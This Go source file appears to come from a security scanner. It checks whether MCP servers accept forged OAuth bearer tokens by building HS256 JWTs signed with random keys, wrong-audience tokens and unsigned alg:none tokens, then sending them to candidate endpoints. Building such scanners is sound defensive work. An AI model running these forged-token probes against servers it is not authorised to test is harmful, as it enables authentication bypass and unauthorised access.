package mcp

import (
	"context"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/calbebop/batesian/internal/attack"
)

// TokenReplayExecutor tests whether an MCP server accepts forged or unsigned
// OAuth 2.1 bearer tokens (rule mcp-token-replay-001). The HS256 probes are
// signed with a random secret the server cannot know, so acceptance proves the
// server does not validate the token signature - which also defeats audience
// binding and enables cross-audience replay. Audience-matching bugs on
// signature-valid tokens are isolated separately by mcp-oauth-audience-002.
//
// Attack sequence:
//  1. Confirm the server participates in OAuth 2.1 / OIDC by probing the known
//     discovery documents (RFC 9728 protected-resource-metadata, RFC 8414
//     authorization-server metadata, and OIDC openid-configuration). If none is
//     present, skip gracefully (the server does not appear to use OAuth).
//  2. Forge three JWTs using stdlib only (no third-party JWT library):
//     - no-aud: HS256 token with no aud claim
//     - wrong-aud: HS256 token with aud pointing to a different server
//     - alg-none: unsigned token (alg:none) whose aud matches the target
//  3. POST each token to {target}/mcp with an MCP initialize request body.
//  4. Emit a finding for any probe that the server ACCEPTS - HTTP 200 carrying a
//     JSON-RPC `result` envelope. A 200 carrying a JSON-RPC `error` (a
//     protocol-layer rejection) or any 4xx is treated as a rejection, so a
//     server that returns 200 + {"error":...} for a bad token is not a finding.
type TokenReplayExecutor struct {
	rule attack.RuleContext
}

// NewTokenReplayExecutor creates an executor for the mcp-token-replay attack type.
func init() {
	attack.Register("mcp-token-replay", func(rc attack.RuleContext) attack.Executor { return NewTokenReplayExecutor(rc) })
}

func NewTokenReplayExecutor(r attack.RuleContext) *TokenReplayExecutor {
	return &TokenReplayExecutor{rule: r}
}

// mcpInitBody is the standard MCP initialize request used as the probe body. The
// offered protocolVersion mirrors latestStable: a stale offered version here is
// rejected as "Unsupported protocol version" by current servers (a silent false
// negative). mcpInitBody is a raw JSON template and cannot reference latestStable
// directly, so TestMcpInitBodyOffersCurrentRevision pins the two together. Shared
// by token_replay and oauth_audience (the legacy wire); dns_rebind_origin pairs
// against the wire-opening handshake and uses legacyHandshakeBody instead.
const mcpInitBody = `{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-11-25","capabilities":{},"clientInfo":{"name":"batesian","version":"dev"}}}`

// Execute runs the token replay / audience validation test.
func (e *TokenReplayExecutor) Execute(ctx context.Context, target string, opts attack.Options) ([]attack.Finding, error) {
	vars := attack.NewVars(target, opts.OOBListenerURL)
	client := attack.NewHTTPClient(opts, vars)

	// Step 1: Confirm the server participates in OAuth 2.1 / OIDC before forging
	// tokens against it. Probe every recognized discovery document, not just the
	// RFC 8414 authorization-server path: an MCP resource server commonly exposes
	// only RFC 9728 protected-resource-metadata (its authorization server may be a
	// separate host), and OIDC deployments expose openid-configuration. Skip when
	// none is present.
	if !oauthMetadataPresent(ctx, client, vars.BaseURL) {
		return nil, oauthNotApplicable(ctx, client, vars.BaseURL)
	}

	// Step 2: Forge the three probe tokens.
	noAudToken, err := forgeHS256JWT(map[string]interface{}{
		"iss": "https://attacker.example.com",
		"sub": "batesian-probe",
		"iat": 1700000000,
		"exp": 9999999999,
	})
	if err != nil {
		return nil, fmt.Errorf("forging no-aud token: %w", err)
	}

	wrongAudToken, err := forgeHS256JWT(map[string]interface{}{
		"iss": "https://attacker.example.com",
		"sub": "batesian-probe",
		"aud": "https://wrong-server.example.com",
		"iat": 1700000000,
		"exp": 9999999999,
	})
	if err != nil {
		return nil, fmt.Errorf("forging wrong-aud token: %w", err)
	}

	algNoneToken, err := forgeAlgNoneJWT(map[string]interface{}{
		"iss": "https://attacker.example.com",
		"sub": "batesian-probe",
		"aud": vars.BaseURL,
		"iat": 1700000000,
		"exp": 9999999999,
	})
	if err != nil {
		return nil, fmt.Errorf("forging alg-none token: %w", err)
	}

	type probe struct {
		name      string
		token     string
		severity  string
		titleSufx string
		descSufx  string
	}

	probes := []probe{
		{
			name:      "no-aud",
			token:     noAudToken,
			severity:  "high",
			titleSufx: "accepted a forged-signature JWT with no aud claim",
			descSufx: "The server accepted a bearer token whose HMAC signature was computed with a " +
				"random key the server cannot know, and which carries no `aud` (audience) claim. " +
				"Acceptance proves the server does not verify the token signature; with signature " +
				"validation absent, audience binding (RFC 9068) cannot be enforced and a token forged " +
				"or issued for any other service can be replayed against this server.",
		},
		{
			name:      "wrong-aud",
			token:     wrongAudToken,
			severity:  "high",
			titleSufx: "accepted a forged-signature JWT with a wrong aud claim",
			descSufx: "The server accepted a bearer token whose HMAC signature was computed with a " +
				"random key the server cannot know, and whose `aud` claim names a different resource " +
				"server (https://wrong-server.example.com). Acceptance proves the server does not " +
				"verify the token signature, so any forged token - including one minted for another " +
				"audience - is accepted and cross-service token replay is possible.",
		},
		{
			name:      "alg-none",
			token:     algNoneToken,
			severity:  "critical",
			titleSufx: "accepted unsigned JWT (alg:none)",
			descSufx: "The server accepted a JWT with `alg:none` and an empty signature. " +
				"This completely bypasses cryptographic token verification: any attacker can " +
				"forge arbitrary claims (including admin roles or elevated scopes) without " +
				"knowing any secret key.",
		},
	}

	// Step 3: Send each probe to each candidate MCP endpoint path.
	// Since the OAuth metadata confirmed this is an OAuth-protected MCP server,
	// we try all standard candidate paths rather than doing an unauthenticated
	// discover probe (which would fail because the endpoint requires a token).
	// anyEndpoint records that at least one candidate answered as something other
	// than an unrouted path. Without it the rule reported clean when every candidate
	// 404'd: the MCP handler may be mounted at /sse + /messages, or at /v1/mcp,
	// while the OAuth metadata sits at the root, and then no forged token was ever
	// examined yet the server was reported as rejecting alg:none and forged
	// signatures. oauth_audience took this fix in #148 against the same candidate
	// list and the same init body; this rule did not.
	anyEndpoint := false
	var findings []attack.Finding
	for _, p := range probes {
		headers := map[string]string{
			"Authorization": "Bearer " + p.token,
			"Content-Type":  "application/json",
		}
		for _, ep := range endpointCandidates(vars.BaseURL) {
			resp, err := client.POST(ctx, ep, headers, json.RawMessage(mcpInitBody))
			if err != nil {
				continue // Network error is not a finding.
			}
			if !endpointAbsent(resp) {
				anyEndpoint = true
			}
			// Acceptance = HTTP 200 with a JSON-RPC result envelope. A 200 that
			// carries a JSON-RPC error is a protocol-layer rejection of the
			// forged token and must not be reported.
			if resp.IsAccepted() {
				findings = append(findings, attack.Finding{
					RuleID:      e.rule.ID,
					RuleName:    e.rule.Name,
					Severity:    p.severity,
					Confidence:  attack.ConfirmedExploit,
					Title:       fmt.Sprintf("MCP server %s", p.titleSufx),
					Description: p.descSufx,
					Evidence: fmt.Sprintf(
						"probe: %s\ntoken header.payload: %s...[signature omitted]\nHTTP %d from %s\n%s",
						p.name, jwtHeaderPayload(p.token), resp.StatusCode, ep, snippetMCP(resp.Body),
					),
					Remediation: e.rule.Remediation,
					TargetURL:   ep,
				})
				break // Found a responsive endpoint for this probe; no need to try others.
			}
		}
	}

	if len(findings) == 0 && !anyEndpoint {
		return nil, fmt.Errorf("%w: %s publishes OAuth metadata but no MCP endpoint answered at "+
			"any candidate path, so no forged token was ever examined",
			attack.ErrInconclusive, vars.BaseURL)
	}
	return findings, nil
}

// oauthWellKnownPaths are the discovery documents that signal a server
// participates in OAuth 2.1 / OIDC. Ordered by MCP relevance: an MCP resource
// server most often exposes RFC 9728 protected-resource-metadata first; the
// RFC 8414 authorization-server document and the OIDC openid-configuration
// document follow. Probing only the authorization-server path produced a silent
// false negative on the (common) OIDC-first and PRM-only deployments.
var oauthWellKnownPaths = []string{
	"/.well-known/oauth-protected-resource",
	"/.well-known/oauth-authorization-server",
	"/.well-known/openid-configuration",
}

// oauthMetadataPresent reports whether the target exposes any recognized OAuth /
// OIDC discovery document. This is only a gate to avoid forging tokens against
// servers that plainly do not use OAuth; the document contents are not used.
func oauthMetadataPresent(ctx context.Context, client *attack.HTTPClient, baseURL string) bool {
	for _, p := range oauthWellKnownPaths {
		resp, err := client.GET(ctx, baseURL+p, nil)
		if err != nil {
			continue
		}
		if resp.IsSuccess() {
			return true
		}
	}
	return false
}

// forgeHS256JWT creates a signed JWT using a random HMAC-SHA256 secret.
// All encoding uses stdlib (encoding/base64, encoding/json, crypto/hmac).
func forgeHS256JWT(claims map[string]interface{}) (string, error) {
	headerJSON, err := json.Marshal(map[string]string{"alg": "HS256", "typ": "JWT"})
	if err != nil {
		return "", err
	}
	payloadJSON, err := json.Marshal(claims)
	if err != nil {
		return "", err
	}

	h := base64.RawURLEncoding.EncodeToString(headerJSON)
	p := base64.RawURLEncoding.EncodeToString(payloadJSON)
	signingInput := h + "." + p

	secret := make([]byte, 32)
	if _, err := rand.Read(secret); err != nil {
		return "", fmt.Errorf("generating random secret: %w", err)
	}
	mac := hmac.New(sha256.New, secret)
	mac.Write([]byte(signingInput))
	sig := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))

	return signingInput + "." + sig, nil
}

// forgeAlgNoneJWT creates a JWT with alg:none and an empty signature segment.
func forgeAlgNoneJWT(claims map[string]interface{}) (string, error) {
	headerJSON, err := json.Marshal(map[string]string{"alg": "none", "typ": "JWT"})
	if err != nil {
		return "", err
	}
	payloadJSON, err := json.Marshal(claims)
	if err != nil {
		return "", err
	}

	h := base64.RawURLEncoding.EncodeToString(headerJSON)
	p := base64.RawURLEncoding.EncodeToString(payloadJSON)
	// alg:none requires an empty (but present) signature segment.
	return h + "." + p + ".", nil
}

// jwtHeaderPayload returns the header.payload segments of a JWT without the signature,
// safe for inclusion in evidence output.
func jwtHeaderPayload(token string) string {
	parts := strings.SplitN(token, ".", 3)
	if len(parts) >= 2 {
		return parts[0] + "." + parts[1]
	}
	return "[invalid-token]"
}
